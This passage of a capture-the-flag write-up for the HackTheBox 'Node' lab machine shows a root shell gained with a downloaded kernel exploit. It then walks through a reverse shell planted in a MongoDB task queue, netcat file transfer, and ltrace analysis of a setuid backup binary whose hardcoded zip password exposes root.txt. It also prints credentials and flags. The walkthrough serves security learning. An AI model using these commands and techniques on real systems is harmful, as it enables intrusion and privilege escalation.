Connecting to 10.10.14.3:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 21784 (21K) [application/octet-stream]
Saving to: ‘45010’
45010                         100%[===============================================>]  21.27K  --.-KB/s    in 0.008s  

2022-05-17 04:38:35 (2.54 MB/s) - ‘45010’ saved [21784/21784]
--2022-05-17 04:38:35--  http://./
Resolving . (.)... failed: Temporary failure in name resolution.
wget: unable to resolve host address ‘.’
FINISHED --2022-05-17 04:38:35--
Total wall clock time: 0.02s
Downloaded: 1 files, 21K in 0.008s (2.54 MB/s)
mark@node:/tmp$ ls
45010               systemd-private-139d0e0973a641f898e170ca332e1a1a-systemd-timesyncd.service-uDRSbH
mongodb-27017.sock  vmware-root
mark@node:/tmp$ chmod +x 45010 
mark@node:/tmp$ ./45010
[.] 
[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
[.] 
[.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **
[.] 
[*] creating bpf map
[*] sneaking evil bpf past the verifier
[*] creating socketpair()
[*] attaching bpf backdoor to socket
[*] skbuff => ffff88002ef0b700
[*] Leaking sock struct from ffff880027fb4400
[*] Sock->sk_rcvtimeo at offset 472
[*] Cred structure at ffff880000901180
[*] UID from cred structure: 1001, matches the current: 1001
[*] hammering cred structure at ffff880000901180
[*] credentials patched, launching shell...
# whoami
root
# cat /root/root.txt
1722e99ca5f353b362556a62bd5e6be0
# locate user.txt
/home/tom/user.txt
# cat /home/tom/user.txt
e1156acc3574e04b06908ecf76be91b1
```

## Intended Way

Let’s check for any interesting running processes in the machine.

```bash
mark@node:~$ ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
...
tom       1218  0.0  5.4 1008056 40992 ?       Ssl  03:13   0:01 /usr/bin/node /var/scheduler/app.js
tom       1220  0.0  5.6 1019880 42868 ?       Ssl  03:13   0:01 /usr/bin/node /var/www/myplace/app.js
root      1223  0.0  0.6  65520  5260 ?        Ss   03:13   0:00 /usr/sbin/sshd -D
mongodb   1224  0.4 11.6 280924 88636 ?        Ssl  03:13   0:07 /usr/bin/mongod --auth --quiet --config /etc/mongod.c
root      1244  0.0  0.0   5224   160 ?        Ss   03:13   0:00 /sbin/iscsid
root      1245  0.0  0.4   5724  3532 ?        S<Ls 03:13   0:00 /sbin/iscsid
root      1313  0.0  0.2  15940  1816 tty1     Ss+  03:13   0:00 /sbin/agetty --noclear tty1 linux
root      1481  0.0  0.0      0     0 ?        S    03:28   0:00 [kworker/0:0]
root      1484  0.0  0.8  95404  6692 ?        Ss   03:36   0:00 sshd: mark [priv]
mark      1486  0.0  0.6  45248  4768 ?        Ss   03:36   0:00 /lib/systemd/systemd --user
mark      1489  0.0  0.3  61572  2300 ?        S    03:36   0:00 (sd-pam)
mark      1496  0.0  0.4  95404  3456 ?        S    03:36   0:00 sshd: mark@pts/0
mark      1497  0.0  0.6  22588  5128 pts/0    Ss   03:36   0:00 -bash
mark      1511  0.0  0.4  37372  3348 pts/0    R+   03:42   0:00 ps aux
```

It turns out that there are 2 processes initiated by the user `tom`. 

Interestingly, there is another `app.js` running from the folder `scheduler`.

```bash
mark@node:~$ cat /var/scheduler/app.js 
const exec        = require('child_process').exec;
const MongoClient = require('mongodb').MongoClient;
const ObjectID    = require('mongodb').ObjectID;
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&authSource=scheduler';

MongoClient.connect(url, function(error, db) {
  if (error || !db) {
    console.log('[!] Failed to connect to mongodb');
    return;
  }

  setInterval(function () {
    db.collection('tasks').find().toArray(function (error, docs) {
      if (!error && docs) {
        docs.forEach(function (doc) {
          if (doc) {
            console.log('Executing task ' + doc._id + '...');
            exec(doc.cmd);
            db.collection('tasks').deleteOne({ _id: new ObjectID(doc._id) });
          }
        });
      }
      else if (error) {
        console.log('Something went wrong: ' + error);
      }
    });
  }, 30000);

});
```

The script seems to be connecting to a MongoDB, which runs a command from the tasks collection every 30 seconds.

That seems to be a vulnerability that we can exploit so lets try connecting to the database.

```bash
mark@node:~$ mongo -u mark -p 5AYRft73VtFpc84k scheduler
MongoDB shell version: 3.2.16
connecting to: scheduler
> show collections
tasks
```

Now, lets try inserting a reverse shell command into the `tasks` collection and open a netcat listener.

```bash
- Mongo DB -
> db.tasks.insert({"cmd":"bash -c 'exec bash -i &>/dev/tcp/10.10.14.6/9999 <&1'"})
WriteResult({ "nInserted" : 1 })
> db.tasks.find()
{ "_id" : ObjectId("6292dff2ead14f78ff847f09"), "cmd" : "bash -c 'exec bash -i &>/dev/tcp/10.10.14.6/9999 <&1'" }

- Local Terminal -
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Node]
└─# nc -nlvp 9999
listening on [any] 9999 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.58] 35994
bash: cannot set terminal process group (1218): Inappropriate ioctl for device
bash: no job control in this shell
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.
tom@node:/$ whoami
whoami
tom
tom@node:/$ id
id
uid=1000(tom) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lpadmin),116(sambashare),1002(admin)
```

Great, now we are connected to the machine as `tom`. 

Lets search for all SUID binaries owned by root.

```bash
tom@node:/$ find / -type f -user root -perm -4000 2>/dev/null
find / -type f -user root -perm -4000 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/local/bin/backup
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/newuidmap
/bin/ping
/bin/umount
/bin/fusermount
/bin/ping6
/bin/ntfs-3g
/bin/su
/bin/mount
```

There seems to be an interesting `backup` file located at `/usr/local/bin/`.

```bash
tom@node:/$ file /usr/local/bin/backup
file /usr/local/bin/backup
/usr/local/bin/backup: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=343cf2d93fb2905848a42007439494a2b4984369, not stripped
tom@node:/$ cd /usr/local/bin
cd /usr/local/bin
tom@node:/usr/local/bin$ backup
backup
```

It seems to be an executable but executing the file returned nothing.
Lets transfer the file to our local machine for some analysis.

```bash
- Netcat Listener - 
tom@node:/usr/local/bin$ nc 10.10.14.6 1234 < /usr/local/bin/backup
nc 10.10.14.6 1234 < /usr/local/bin/backup
tom@node:/usr/local/bin$ md5sum backup
md5sum backup
f2cd106436c96a80133fcddd06206042  backup

- Local Terminal -
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Node]
└─# nc -nlvp 1234 > backup         
listening on [any] 1234 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.58] 52188
                                                                    
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Node]
└─# ls -la
total 5992
drwxr-xr-x  3 root  root     4096 May 29 11:03 .
drwxr-xr-x 20 root  root     4096 May 17 10:03 ..
-rwxr-xr-x  1 root  root    21784 May 17 11:37 45010
-rw-r--r--  1 root  root    13176 May 17 11:36 45010.c
-rw-r--r--  1 root  root    16484 May 29 11:03 backup
-rw-r--r--  1 root  root  2594909 May 17 11:01 decoded.zip
-rw-r--r--  1 root  root     1063 May 17 11:08 hash.txt
-rw-r--r--  1 shiro shiro 3459880 May 17 10:58 myplace.backup
drwxr-xr-x  3 root  root     4096 May 17 11:09 var

┌──(root㉿shiro)-[/home/shiro/HackTheBox/Node]
└─# md5sum backup         
f2cd106436c96a80133fcddd06206042  backup
```

Now we can analyse the file.

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Node]
└─# chmod +x backup  

┌──(root㉿shiro)-[/home/shiro/HackTheBox/Node]
└─# ltrace ./backup 
__libc_start_main(0x80489fd, 1, 0xffa58164, 0x80492c0 <unfinished ...>
geteuid()                                                               = 0
setuid(0)                                                               = 0
exit(1 <no return ...>
+++ exited (status 1) +++
```

It seems that the file exited gracefully without any errors.

Lets analyse the file on IDA then.

![ida](ida.png)

Upon opening the file on IDA, I noticed something interesting.

```assembly
cmp     dword ptr [ebx], 3
```

The main function seems to be checking if there are 3 arguments.

Lets confirm our hypothesis!

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Node]
└─# ./backup 1 2 3                           



             ____________________________________________________
            /                                                    \
           |    _____________________________________________     |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |             Secure Backup v1.0              |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |_____________________________________________|    |
           |                                                      |
            \_____________________________________________________/
                   \_______________________________________/
                _______________________________________________
             _-'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_
          _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_
       _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_
    _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_
 _-'.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_
:-----------------------------------------------------------------------------:
`---._.-----------------------------------------------------------------._.---'


 [!] Could not open file
```

Awesome, we were correct!

Lets analyse the program with `ltrace`!

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Node]
└─# ltrace ./backup 1 2 3
__libc_start_main(0x80489fd, 4, 0xffb837f4, 0x80492c0 <unfinished ...>
geteuid()                                                               = 0
setuid(0)                                                               = 0
strcmp("1", "-q")                                                       = 1
...
strncpy(0xffea6e28, "2", 100)                                           = 0xffea6e28
strcpy(0xffea6e11, "/")                                                 = 0xffea6e11
strcpy(0xffea6e1d, "/")                                                 = 0xffea6e1d
strcpy(0xffea6da7, "/e")                                                = 0xffea6da7
strcat("/e", "tc")                                                      = "/etc"
strcat("/etc", "/m")                                                    = "/etc/m"
strcat("/etc/m", "yp")                                                  = "/etc/myp"
strcat("/etc/myp", "la")                                                = "/etc/mypla"
strcat("/etc/mypla", "ce")                                              = "/etc/myplace"
strcat("/etc/myplace", "/k")                                            = "/etc/myplace/k"
strcat("/etc/myplace/k", "ey")                                          = "/etc/myplace/key"
strcat("/etc/myplace/key", "s")                                         = "/etc/myplace/keys"
fopen("/etc/myplace/keys", "r")                                         = 0
strcpy(0xffea59f8, "Could not open file\n\n")                           = 0xffea59f8
printf(" %s[!]%s %s\n", "\033[33m", "\033[37m", "Could not open file\n\n" [!] Could not open file
) = 37
exit(1 <no return ...>
+++ exited (status 1) +++
```

From the `ltrace` information, it seems that the program is trying to read a file from `/etc/myplace/keys`.

Also, I noticed that the program is trying to obtain `-q` from the first argument.

```c
strcmp("1", "-q") 
```

Lets check out what’s the content of `/etc/myplace/keys`.

```bash
tom@node:/usr/local/bin$ cat /etc/myplace/keys
cat /etc/myplace/keys
a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508
45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474
3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110
```

It seems like there are 3 keys.

Lets create the same exact `keys` file in our local machine to for the program to run.

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Node]
└─# cat /etc/myplace/keys 
a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508
45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474
3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110

┌──(root㉿shiro)-[/home/shiro/HackTheBox/Node]
└─# ltrace ./backup -q 2 3
__libc_start_main(0x80489fd, 4, 0xffe903b4, 0x80492c0 <unfinished ...>
geteuid()                                                               = 0
setuid(0)                                                               = 0
strcmp("-q", "-q")                                                      = 0
...
strcat("/etc/myplace/key", "s")                                         = "/etc/myplace/keys"
fopen("/etc/myplace/keys", "r")                                         = 0x8cb11a0
fgets("a01a6aa5aaf1d7729f35c8278daae30f"..., 1000, 0x8cb11a0)           = 0xffe8fdff
strcspn("a01a6aa5aaf1d7729f35c8278daae30f"..., "\n")                    = 64
strcmp("2", "a01a6aa5aaf1d7729f35c8278daae30f"...)                      = -1
fgets("45fac180e9eee72f4fd2d9386ea7033e"..., 1000, 0x8cb11a0)           = 0xffe8fdff
strcspn("45fac180e9eee72f4fd2d9386ea7033e"..., "\n")                    = 64
strcmp("2", "45fac180e9eee72f4fd2d9386ea7033e"...)                      = -1
fgets("3de811f4ab2b7543eaf45df611c2dd25"..., 1000, 0x8cb11a0)           = 0xffe8fdff
strcspn("3de811f4ab2b7543eaf45df611c2dd25"..., "\n")                    = 64
strcmp("2", "3de811f4ab2b7543eaf45df611c2dd25"...)                      = -1
fgets("3de811f4ab2b7543eaf45df611c2dd25"..., 1000, 0x8cb11a0)           = 0
exit(1 <no return ...>
+++ exited (status 1) +++
```

It seems like the program is trying to compare the second arguments to the strings in the `keys` file.

Now, what if I supplied 1 of the keys as the second argument?

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Node]
└─# ltrace ./backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 3
__libc_start_main(0x80489fd, 4, 0xff871fb4, 0x80492c0 <unfinished ...>
geteuid()                                                               = 0
setuid(0)                                                               = 0
strcmp("-q", "-q")                                                      = 0
...
strcat("/etc/myplace/key", "s")                                         = "/etc/myplace/keys"
fopen("/etc/myplace/keys", "r")                                         = 0x9d9c1a0
fgets("a01a6aa5aaf1d7729f35c8278daae30f"..., 1000, 0x9d9c1a0)           = 0xff8719ff
strcspn("a01a6aa5aaf1d7729f35c8278daae30f"..., "\n")                    = 64
strcmp("45fac180e9eee72f4fd2d9386ea7033e"..., "a01a6aa5aaf1d7729f35c8278daae30f"...) = -1
fgets("45fac180e9eee72f4fd2d9386ea7033e"..., 1000, 0x9d9c1a0)           = 0xff8719ff
strcspn("45fac180e9eee72f4fd2d9386ea7033e"..., "\n")                    = 64
strcmp("45fac180e9eee72f4fd2d9386ea7033e"..., "45fac180e9eee72f4fd2d9386ea7033e"...) = 0
fgets("3de811f4ab2b7543eaf45df611c2dd25"..., 1000, 0x9d9c1a0)           = 0xff8719ff
strcspn("3de811f4ab2b7543eaf45df611c2dd25"..., "\n")                    = 64
strcmp("45fac180e9eee72f4fd2d9386ea7033e"..., "3de811f4ab2b7543eaf45df611c2dd25"...) = 1
fgets("3de811f4ab2b7543eaf45df611c2dd25"..., 1000, 0x9d9c1a0)           = 0
strstr("3", "..")                                                       = nil
strstr("3", "/root")                                                    = nil
strchr("3", ';')                                                        = nil
strchr("3", '&')                                                        = nil
strchr("3", '`')                                                        = nil
strchr("3", '$')                                                        = nil
strchr("3", '|')                                                        = nil
strstr("3", "//")                                                       = nil
strcmp("3", "/")                                                        = 1
strstr("3", "/etc")                                                     = nil
strcpy(0xff87180b, "3")                                                 = 0xff87180b
getpid()                                                                = 4426
time(0)                                                                 = 1653796388
clock(0, 0, 0, 0)                                                       = 5540
srand(0xac64594b, 0x688d931a, 0xac64594b, 0x804918c)                    = 0
rand(0, 0, 0, 0)                                                        = 0x54aedc7f
sprintf("/tmp/.backup_1420745855", "/tmp/.backup_%i", 1420745855)       = 23
sprintf("/usr/bin/zip -r -P magicword /tm"..., "/usr/bin/zip -r -P magicword %s "..., "/tmp/.backup_1420745855", "3") = 66
system("/usr/bin/zip -r -P magicword /tm"... <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                  = 3072
access("/tmp/.backup_1420745855", 0)                                    = -1
remove("/tmp/.backup_1420745855")                                       = -1
fclose(0x9d9c1a0)                                                       = 0
+++ exited (status 0) +++
```

The program seems to be checking for a directory path for the 3rd argument..

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Node]
└─# ltrace ./backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /tmp
...
<Some Base64 encoded text here>
...
+++ exited (status 0) +++
```

Oh? It seems like there is a base64 output this time. Perhaps we are on the right track?

Lets test out the actual program on the netcat listener.

```bash
tom@node:/usr/local/bin$ mkdir /tmp
mkdir /tmp
mkdir: cannot create directory ‘/tmp’: File exists
tom@node:/usr/local/bin$ cd /tmp
cd /tmp
tom@node:/tmp$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /tmp > test
<72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /tmp > test 
tom@node:/tmp$ cat test | base64 --decode > decoded   
cat test | base64 --decode > decoded
tom@node:/tmp$ file decoded
file decoded
decoded: Zip archive data, at least v1.0 to extract
unzip decoded
Archive:  decoded
   creating: tmp/
   skipping: tmp/test                unable to get password
   creating: tmp/.Test-unix/
   creating: tmp/.XIM-unix/
   creating: tmp/vmware-root/
   creating: tmp/systemd-private-bf4be7c8a9db4aab9b2c4d4642af2f48-systemd-timesyncd.service-h09Jlq/
   creating: tmp/systemd-private-bf4be7c8a9db4aab9b2c4d4642af2f48-systemd-timesyncd.service-h09Jlq/tmp/
   creating: tmp/.X11-unix/
   creating: tmp/.ICE-unix/
   creating: tmp/.font-unix/
```

Great! It looks like the unzipped folder contains the files inside that directory that we specified.

Lets try grabbing the root folder!

```bash
tom@node:/tmp$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /root > test2
<72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /root > test2       
tom@node:/tmp$ cat test2 | base64 --decode > decoded2
cat test2 | base64 --decode > decoded2
base64: invalid input
tom@node:/tmp$ cat test2 
cat test2
 [+] Finished! Encoded backup is below:

UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpSvYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZorY67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd26PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==
```

It seems like we couldn’t decode the text because of `[+] Finished! Encoded backup is below:`.

Lets echo the base64 part to a new file instead.

```
7XLo8C3RH/hu0fArpSvYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZorY67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd26PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==" > test2
tom@node:/tmp$ cat test2 | base64 --decode > decoded2
cat test2 | base64 --decode > decoded2
tom@node:/tmp$ file decoded2
file decoded2
decoded2: Zip archive data
tom@node:/tmp$ unzip decoded2
unzip decoded2
Archive:  decoded2
   skipping: root.txt                need PK compat. v5.1 (can do v4.6)
```

At this point, I keep getting the error that we couldn’t unzip the file. 

A quick Google search shows that we need to use `7z` instead.

So, I decided to transfer the file to my local machine.

```bash
- Netcat Listener -
tom@node:/tmp$ nc 10.10.14.6 1234 < decoded2
nc 10.10.14.6 1234 < decoded2

- Local Terminal -
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Node]
└─# nc -nlvp 1234 > decoded2
listening on [any] 1234 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.58] 52194

┌──(root㉿shiro)-[/home/shiro/HackTheBox/Node]
└─# 7z x decoded2

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_SG.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs AMD Ryzen 7 3700X 8-Core Processor              (870F10),ASM,AES-NI)

Scanning the drive for archives:
1 file, 1141 bytes (2 KiB)

Extracting archive: decoded2
--
Path = decoded2
Type = zip
Physical Size = 1141

Enter password (will not be echoed):magicword
Everything is Ok

Size:       2584
Compressed: 1141

┌──(root㉿shiro)-[/home/shiro/HackTheBox/Node]
└─# cat root.txt         
QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ
QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ
QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ
QQQQQQQQQQQQQQQQQQQWQQQQQWWWBBBHHHHHHHHHBWWWQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ
QQQQQQQQQQQQQQQD!`__ssaaaaaaaaaass_ass_s____.  -~""??9VWQQQQQQQQQQQQQQQQQQQ
QQQQQQQQQQQQQP'_wmQQQWWBWV?GwwwmmWQmwwwwwgmZUVVHAqwaaaac,"?9$QQQQQQQQQQQQQQ
QQQQQQQQQQQW! aQWQQQQW?qw#TTSgwawwggywawwpY?T?TYTYTXmwwgZ$ma/-?4QQQQQQQQQQQ
QQQQQQQQQQW' jQQQQWTqwDYauT9mmwwawww?WWWWQQQQQ@TT?TVTT9HQQQQQQw,-4QQQQQQQQQ
QQQQQQQQQQ[ jQQQQQyWVw2$wWWQQQWWQWWWW7WQQQQQQQQPWWQQQWQQw7WQQQWWc)WWQQQQQQQ
QQQQQQQQQf jQQQQQWWmWmmQWU???????9WWQmWQQQQQQQWjWQQQQQQQWQmQQQQWL 4QQQQQQQQ
QQQQQQQP'.yQQQQQQQQQQQP"       <wa,.!4WQQQQQQQWdWP??!"??4WWQQQWQQc ?QWQQQQQ
QQQQQP'_a.<aamQQQW!<yF "!` ..  "??$Qa "WQQQWTVP'    "??' =QQmWWV?46/ ?QQQQQ
QQQP'sdyWQP?!`.-"?46mQQQQQQT!mQQgaa. <wWQQWQaa _aawmWWQQQQQQQQQWP4a7g -WWQQ
QQ[ j@mQP'adQQP4ga, -????" <jQQQQQWQQQQQQQQQWW;)WQWWWW9QQP?"`  -?QzQ7L ]QQQ
QW jQkQ@ jWQQD'-?$QQQQQQQQQQQQQQQQQWWQWQQQWQQQc "4QQQQa   .QP4QQQQfWkl jQQQ
QE ]QkQk $D?`  waa "?9WWQQQP??T?47`_aamQQQQQQWWQw,-?QWWQQQQQ`"QQQD\Qf(.QWQQ
QQ,-Qm4Q/-QmQ6 "WWQma/  "??QQQQQQL 4W"- -?$QQQQWP`s,awT$QQQ@  "QW@?$:.yQQQQ
QQm/-4wTQgQWQQ,  ?4WWk 4waac -???$waQQQQQQQQF??'<mWWWWWQW?^  ` ]6QQ' yQQQQQ
QQQQw,-?QmWQQQQw  a,    ?QWWQQQw _.  "????9VWaamQWV???"  a j/  ]QQf jQQQQQQ
QQQQQQw,"4QQQQQQm,-$Qa     ???4F jQQQQQwc <aaas _aaaaa 4QW ]E  )WQ`=QQQQQQQ
QQQQQQWQ/ $QQQQQQQa ?H ]Wwa,     ???9WWWh dQWWW,=QWWU?  ?!     )WQ ]QQQQQQQ
QQQQQQQQQc-QWQQQQQW6,  QWQWQQQk <c                             jWQ ]QQQQQQQ
QQQQQQQQQQ,"$WQQWQQQQg,."?QQQQ'.mQQQmaa,.,                . .; QWQ.]QQQQQQQ
QQQQQQQQQWQa ?$WQQWQQQQQa,."?( mQQQQQQW[:QQQQm[ ammF jy! j( } jQQQ(:QQQQQQQ
QQQQQQQQQQWWma "9gw?9gdB?QQwa, -??T$WQQ;:QQQWQ ]WWD _Qf +?! _jQQQWf QQQQQQQ
QQQQQQQQQQQQQQQws "Tqau?9maZ?WQmaas,,    --~-- ---  . _ssawmQQQQQQk 3QQQQWQ
QQQQQQQQQQQQQQQQWQga,-?9mwad?1wdT9WQQQQQWVVTTYY?YTVWQQQQWWD5mQQPQQQ ]QQQQQQ
QQQQQQQWQQQQQQQQQQQWQQwa,-??$QwadV}<wBHHVHWWBHHUWWBVTTTV5awBQQD6QQQ ]QQQQQQ
QQQQQQQQQQQQQQQQQQQQQQWWQQga,-"9$WQQmmwwmBUUHTTVWBWQQQQWVT?96aQWQQQ ]QQQQQQ
QQQQQQQQQQWQQQQWQQQQQQQQQQQWQQma,-?9$QQWWQQQQQQQWmQmmmmmQWQQQQWQQW(.yQQQQQW
